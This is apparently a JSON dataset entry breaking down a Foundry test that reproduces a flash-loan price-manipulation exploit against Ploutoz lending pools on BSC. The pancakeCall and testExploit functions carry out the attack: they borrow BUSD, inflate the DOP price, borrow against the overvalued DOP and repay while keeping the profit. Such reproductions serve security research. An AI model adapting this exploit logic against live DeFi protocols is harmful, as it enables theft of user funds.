[
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0Out, uint256 amount1Out, bytes memory data) external {\n        //Pump price of DOP in both pairs\n        swapTokenToToken(BUSD, DOP, 1_000_000 ether, TwindexSwapRouter);\n        swapTokenToToken(BUSD, DOP, 400 ether, PancakeRouter);\n\n        //Here we borrow the assets,using few DOP which is overvalued\n        borrowMultipleLoans();\n\n        //Swap enough DOP to payback flashloan and keep profit\n        swapTokenToToken(DOP, BUSD, 570_625_638_619_593_832_545_805, TwindexSwapRouter);\n\n        //Payback flashloan\n        IERC20(BUSD).transfer(PancakeSwap, 1_002_951.02 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        fundingToken = address(BUSD);\n\n        IERC20(BUSD).approve(TwindexSwapRouter, type(uint256).max);\n        IERC20(DOP).approve(TwindexSwapRouter, type(uint256).max);\n        IERC20(BUSD).approve(PancakeRouter, type(uint256).max);\n\n        IERC20(DOP).approve(pBUSD, type(uint256).max);\n        IERC20(DOP).approve(pUSDT, type(uint256).max);\n        IERC20(DOP).approve(pBTCB, type(uint256).max);\n        IERC20(DOP).approve(pWETH, type(uint256).max);\n        IERC20(DOP).approve(pDOLLY, type(uint256).max);\n        IERC20(DOP).approve(pCAKE, type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ploutoz",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        uint256 _amount0Out = 0;\n        uint256 _amount1Out = 1_000_400.0 ether;\n        IUniswapV2Pair(PancakeSwap).swap(_amount0Out, _amount1Out, address(this), \"X\");\n\n        swapLoanedTokenToStables();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILoanToken",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILoanToken",
    "source_type": "victim_contract",
    "function_name": "loanTokenAddress",
    "original_code": "",
    "description": ""
  }
]